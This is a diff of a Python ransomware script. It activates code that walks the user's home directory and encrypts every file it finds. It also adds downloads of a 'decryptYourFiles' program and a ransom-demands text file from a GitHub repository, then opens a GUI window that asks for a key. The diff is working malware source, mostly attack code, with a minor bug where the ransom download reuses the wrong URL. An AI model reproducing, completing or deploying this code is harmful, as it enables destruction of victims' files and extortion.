@@ -23,23 +23,29 @@ excluded_files = {
 
 files = []
 
+# Download the decryption program
 url = 'https://github.com/HKing3/EncryptStuff/raw/refs/heads/main/decryptYourFiles'
 response = requests.get(url)
-
 decrypt_file_path = 'decryptYourFiles'
 urllib.request.urlretrieve(url, decrypt_file_path)
+
+# Download the ransom and instructions
+ransom_url = 'https://raw.githubusercontent.com/HKing3/EncryptStuff/refs/heads/main/RansomDemands.txt'
+ransom_response = requests.get(url)
+ransom_file_path = 'RandomDemands.txt'
+urllib.request.urlretrieve(url, ransom_file_path)
 
 try:
     home_dir = os.path.expanduser("~")
     print("Getting files in " + str(home_dir))
-    """for root, dirs, filenames in os.walk(home_dir):
+    for root, dirs, filenames in os.walk(home_dir):
         # comprehension to remove unwanted dirs
         dirs[:] = [d for d in dirs if d not in excluded_dirs]
     
         for file in filenames:
             if file in excluded_files:
                 continue
-            files.append(os.path.join(root, file))"""
+            files.append(os.path.join(root, file))
 
     #print(files)
 
@@ -48,7 +54,7 @@ try:
     secret_key = generate_key(password, salt)
 
     # encrypt
-    """for file in files:
+    for file in files:
         try:
             with open(file, "rb") as _file:
                 contents = _file.read()
@@ -59,7 +65,7 @@ try:
             with open(file, "wb") as _file:
                 _file.write(enc_content)
         except:
-            print("File could not be modified")"""
+            print("File could not be modified")
 
     # create a tkinter root window to display GUI
     root = Tk()
@@ -135,4 +141,3 @@ except KeyboardInterrupt:
     pk_entry.pack()
     button.pack(side='bottom')
     root.mainloop()
-
